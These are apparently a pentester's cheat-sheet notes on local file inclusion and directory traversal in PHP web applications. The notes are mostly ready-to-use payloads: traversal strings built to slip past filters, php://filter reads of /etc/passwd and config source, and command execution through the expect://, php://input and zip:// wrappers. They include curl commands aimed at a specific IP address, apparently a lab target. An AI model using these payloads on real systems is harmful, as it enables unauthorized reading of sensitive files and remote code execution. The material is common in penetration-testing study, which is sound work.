# File Inclusion / Directory Traversal

[Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

[Blog](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/) The Proc File System

## LFI

```
 /etc/passwd on Linux or C:\Windows\boot.ini on Windows
 #if input from parameters used as part of filenames
 we can bypass by adding /../ in the
  
 # if Blacklisting is not coded correctly
 ..././ and ....// would become ../ vice vers sa
 cat .?/.*/.?/etc/passwd.
 Bash allows for for the ? and * wildcards to be used as wildcard
 
 #On PHP versions 5.3.4 and earlier, string-based detection could be bypassed by URL encoding the payload. 
 The characters ../ can be URL encoded into %2e%2e%2f, which will bypass the filter.
```

PHP provides various wrappers, which can be used for easier access to files, protocols, or streams. A list of wrappers can be found [here](https://www.php.net/manual/en/wrappers.php.php). The `php://` wrapper is enabled by default and interacts with IO streams.

PHP filter to convert file contents to Base64

```
 php://filter/read=convert.base64-encode/resource=/etc/passwd
 #we can get the source code and decode it
 curl http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config
```



### PHP filter to convert file contents to ROT13

```
php://filter/read=string.rot13/resource=/etc/passwd
```

### Command execution with PHP `Expect` wrapper

```
expect://id
```

#### Using PHP `Input` wrapper for command execution

```
curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"
```

### Command execution with the PHP `Zip` wrapper

```
zip://malicious.zip%23exec.php&cmd=id
```
